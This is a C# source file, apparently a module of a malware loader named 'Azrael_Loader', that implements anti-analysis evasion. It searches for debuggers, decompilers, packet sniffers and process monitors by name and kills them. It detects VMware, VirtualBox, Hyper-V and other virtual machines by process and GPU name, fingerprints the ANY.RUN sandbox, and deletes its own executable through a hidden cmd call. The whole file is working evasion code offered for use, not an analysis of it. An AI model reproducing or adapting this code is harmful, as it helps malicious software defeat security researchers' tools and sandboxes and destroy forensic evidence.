using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.IO;
using System.Linq;

namespace Azrael_Loader.Modules
{
    internal class Runtime
    {
        public static bool AntiProcess() // Check Forbidden processes to kill
        {

            string[] forbiddenProcesses = {
                "dnspy", "Mega Dumper", "Dumper", "PE-bear", "de4dot", "TCPView", "Resource Hacker", "Pestudio", "HxD", "Scylla",
                "de4dot", "PE-bear", "Fakenet-NG", "ProcessExplorer", "SoftICE", "ILSpy", "dump", "proxy", "de4dotmodded", "StringDecryptor",
                "Centos", "SAE", "monitor", "brute", "checker", "zed", "sniffer", "http", "debugger", "james",
                "exeinfope", "codecracker", "x32dbg", "x64dbg", "ollydbg", "ida -", "charles", "dnspy", "simpleassembly", "peek",
                "httpanalyzer", "httpdebug", "fiddler", "wireshark", "dbx", "mdbg", "gdb", "windbg", "dbgclr", "kdb",
                "kgdb", "mdb", "ollydbg", "dumper", "wireshark", "httpdebugger", "http debugger", "fiddler", "decompiler", "unpacker",
                "deobfuscator", "de4dot", "confuser", " /snd", "x64dbg", "x32dbg", "x96dbg", "process hacker", "dotpeek", ".net reflector",
                "ilspy", "file monitoring", "file monitor", "files monitor", "netsharemonitor", "fileactivitywatcher", "fileactivitywatch", "windows explorer tracker", "process monitor", "disk pluse",
                "file activity monitor", "fileactivitymonitor", "file access monitor", "mtail", "snaketail", "tail -n", "httpnetworksniffer", "microsoft message analyzer", "networkmonitor", "network monitor",
                "soap monitor", "ProcessHacker", "internet traffic agent", "socketsniff", "networkminer", "network debugger", "HTTPDebuggerUI", "mitmproxy", "python", "mitm", "Wireshark","UninstallTool", "UninstallToolHelper", "ProcessHacker",
            };
            var processes = Process.GetProcesses();

            foreach (var processName in forbiddenProcesses)
            {
                foreach (var process in processes)
                {
                    if (process.ProcessName.ToLower() == processName.ToLower())
                    {
                        try
                        {
                            process.Kill();
                            process.Dispose();
                        }
                        catch { }


                        return true;
                    }
                }
            }
            return false;
        }
        public static bool AntiVM_Process() // Check Virtual Machine
        {
            string[] vmProcesses = {
                "vmtoolsd", "vmwaretray", "vmwareuser", "vgauthservice", "vmacthlp",
                "vmsrvc", "vmusrvc", "prl_cc", "prl_tools", "xenservice", "qemu-ga", "joeboxcontrol",
                "ksdumperclient", "ksdumper", "joeboxserver", "vmwareservice", "vmwaretray", "VBoxService",
                "VBoxsTray", "rdpclip",
            };

            var processes = Process.GetProcesses();

            foreach (var process in processes)
            {
                foreach (var processName in vmProcesses)
                {
                    if (process.ProcessName.ToLower() == processName.ToLower())
                    {
                        return true;
                    }
                }
            }
            return false;
        }

        public static bool AntiVM_GPU()
        {
            var virtualGpus = new List<string>()
        {
            "VirtualBox", "VBox", "VMware Virtual", "VMware", "Hyper-V Video"
        };

            var gpus = Auxiliary.GetGPUs();
            return virtualGpus.Any(vgpu => gpus.Any(gpu => gpu.IndexOf(vgpu, StringComparison.OrdinalIgnoreCase) >= 0));
        }

        public static bool AntiAnyRun() // Detect anyrun
        {
            string[] array = { "Acrobat Reader DC.lnk", "CCleaner.lnk", "FileZilla Client.lnk", "Firefox.lnk", "Google Chrome.lnk", "Skype.lnk", "Microsoft Edge.lnk" };

            foreach (string fileName in array)
            {
                if (!File.Exists(Path.Combine(Environment.ExpandEnvironmentVariables("%systemdrive%"), "Users", "Public", "Desktop", fileName)))
                {
                    return false;
                }
            }

            return Environment.UserName.Equals("admin", StringComparison.OrdinalIgnoreCase) && Environment.MachineName.Contains("USER-PC");
        }

        public static void SelfRemove()
        {
            var fileName = Process.GetCurrentProcess().MainModule.FileName;
            var folder = Path.GetDirectoryName(fileName);
            var currentProcessFileName = Path.GetFileName(fileName);

            var arguments = $"/c timeout /t 1 && DEL /f {currentProcessFileName} ";
            var processStartInfo = new ProcessStartInfo()
            {
                FileName = "cmd",
                UseShellExecute = false,
                CreateNoWindow = true,
                Arguments = arguments,
                WorkingDirectory = folder,
            };

            Process.Start(processStartInfo);
            Environment.Exit(0);
        }
    }
}
